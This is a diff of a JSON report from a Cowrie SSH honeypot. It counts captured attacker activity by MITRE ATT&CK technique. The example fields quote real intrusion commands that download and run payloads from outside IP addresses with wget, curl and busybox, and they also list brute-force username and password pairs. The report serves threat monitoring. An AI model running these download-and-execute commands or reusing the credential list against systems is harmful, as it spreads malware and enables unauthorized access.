@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-06 18:02:21",
+  "generated": "2026-09-06 19:00:43",
   "totals": {
-    "commands": 238,
-    "login_failed": 2834,
-    "login_success": 94,
-    "sessions": 2521
+    "commands": 319,
+    "login_failed": 2912,
+    "login_success": 103,
+    "sessions": 2591
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2834,
+      "count": 2912,
       "examples": [
         "root / Server@123",
         "admin / qazwsx",
@@ -21,30 +21,14 @@
         "root / server123"
       ],
       "first": "2026-09-06T00:01:48.192357Z",
-      "last": "2026-09-06T18:02:20.586628Z",
-      "unique_ips": 180
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 94,
-      "examples": [
-        "ftpuser / ftpuser",
-        "support / 22222",
-        "root / 1234",
-        "ftpuser / test",
-        "ubuntu / ubuntu"
-      ],
-      "first": "2026-09-06T00:08:31.210876Z",
-      "last": "2026-09-06T17:56:07.887344Z",
-      "unique_ips": 83
+      "last": "2026-09-06T19:00:07.902554Z",
+      "unique_ips": 191
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 86,
+      "count": 117,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -53,14 +37,30 @@
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"
       ],
       "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T17:56:07.405156Z",
-      "unique_ips": 10
+      "last": "2026-09-06T18:40:21.692860Z",
+      "unique_ips": 12
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 103,
+      "examples": [
+        "ftpuser / ftpuser",
+        "support / 22222",
+        "root / 1234",
+        "ftpuser / test",
+        "ubuntu / ubuntu"
+      ],
+      "first": "2026-09-06T00:08:31.210876Z",
+      "last": "2026-09-06T18:47:13.346902Z",
+      "unique_ips": 89
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 42,
+      "count": 55,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -69,8 +69,8 @@
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi"
       ],
       "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T17:59:04.358025Z",
-      "unique_ips": 10
+      "last": "2026-09-06T18:40:21.692860Z",
+      "unique_ips": 12
     },
     {
       "id": "T1082",
@@ -89,6 +89,19 @@
       "unique_ips": 7
     },
     {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 8,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-09-06T03:22:52.847139Z",
+      "last": "2026-09-06T18:39:45.543857Z",
+      "unique_ips": 8
+    },
+    {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
@@ -101,19 +114,6 @@
       "first": "2026-09-06T00:40:30.920724Z",
       "last": "2026-09-06T15:32:27.792160Z",
       "unique_ips": 2
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 6,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
-      ],
-      "first": "2026-09-06T03:22:52.847139Z",
-      "last": "2026-09-06T16:16:28.803231Z",
-      "unique_ips": 6
     },
     {
       "id": "T1070.004",
@@ -171,15 +171,23 @@
   "unmapped": [
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      32
+      48
     ],
     [
       "shell",
-      10
+      13
     ],
     [
       "sh",
-      9
+      12
+    ],
+    [
+      "enable",
+      10
+    ],
+    [
+      "system",
+      10
     ],
     [
       "/bin/busybox",
@@ -187,31 +195,51 @@
     ],
     [
       "cd /proc && cat self/cmdline",
-      7
-    ],
-    [
-      "enable",
-      7
-    ],
-    [
-      "system",
-      7
-    ],
-    [
-      "linuxshell",
-      6
+      9
     ],
     [
       "/bin/busybox YM58GUjK",
-      6
+      9
+    ],
+    [
+      "linuxshell",
+      8
     ],
     [
       "enablelinuxshell",
-      5
+      7
     ],
     [
       "ping ;sh",
-      5
+      7
+    ],
+    [
+      "su",
+      3
+    ],
+    [
+      "/bin/busybox cat /proc/mounts; /bin/busybox YM58GUjK",
+      3
+    ],
+    [
+      "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/tmp' > /tmp/.none; /bin/busybox cat /tmp/.none; /bin/busybox rm /tmp/.none",
+      3
+    ],
+    [
+      "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/dev' > /dev/.none; /bin/busybox cat /dev/.none; /bin/busybox rm /dev/.none",
+      3
+    ],
+    [
+      "rm /tmp/.t; rm /tmp/.sh; rm /tmp/.human",
+      3
+    ],
+    [
+      "cd /tmp/",
+      3
+    ],
+    [
+      "/bin/busybox cat /bin/echo",
+      3
     ],
     [
       "exit",
@@ -219,34 +247,6 @@
     ],
     [
       "/bin/busybox TOKEN",
-      2
-    ],
-    [
-      "su",
-      2
-    ],
-    [
-      "/bin/busybox cat /proc/mounts; /bin/busybox YM58GUjK",
-      2
-    ],
-    [
-      "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/tmp' > /tmp/.none; /bin/busybox cat /tmp/.none; /bin/busybox rm /tmp/.none",
-      2
-    ],
-    [
-      "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/dev' > /dev/.none; /bin/busybox cat /dev/.none; /bin/busybox rm /dev/.none",
-      2
-    ],
-    [
-      "rm /tmp/.t; rm /tmp/.sh; rm /tmp/.human",
-      2
-    ],
-    [
-      "cd /tmp/",
-      2
-    ],
-    [
-      "/bin/busybox cat /bin/echo",
       2
     ]
   ]
